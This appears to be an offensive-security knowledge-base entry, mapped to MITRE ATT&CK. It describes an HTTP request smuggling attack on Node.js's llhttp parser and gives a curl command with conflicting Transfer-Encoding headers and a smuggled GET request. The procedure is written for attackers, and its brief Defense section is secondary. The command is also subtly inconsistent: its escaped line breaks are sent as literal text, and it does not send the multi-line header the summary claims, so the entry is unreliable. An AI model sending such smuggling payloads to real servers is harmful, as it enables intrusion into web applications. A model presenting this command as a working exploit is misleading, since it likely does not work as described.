---
tags:
  - http-request-smuggling
  - web-exploit
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-request]]'
platforms:
  - Web
  - Node.js
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: cd0d91d7-5b68-4279-a6f0-a9ae8b34e647
created_at: '2025-12-13T09:01:17.289Z'
updated_at: '2025-12-13T09:01:17.289Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Multi-line Transfer-Encoding Request

## Summary
This procedure crafts an HTTP request with multi-line Transfer-Encoding headers to exploit the llhttp parsing vulnerability in Node.js.

## Description
The root cause is incorrect parsing, allowing request smuggling. Craft requests that front-end and back-end interpret differently.

## Requirements
1. Vulnerable Node.js target
2. Curl for sending custom headers
3. Understanding of HTTP smuggling

## Defense
- Patch llhttp to fixed versions
- Use WAF to block multi-line headers

## Objectives
1. Trigger parsing desynchronization
2. Smuggle secondary request
3. Enable further attacks

## Instructions

### Step 1: Basic Smuggling Request
**Context**: Send request with conflicting encodings.

**Command** ([[commands/curl-http-request]]):
```bash
curl -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: gzip" --data "0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com
```

> This smuggles a GET request.

## MITRE ATT&CK Mapping

### Tactics
- [[Execution]]

### Techniques
- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used
- [[commands/curl-http-request]]

## Tools Used
- [[tools/Curl]]

## Tags
- [[http-request-smuggling]]
- [[web-exploit]]
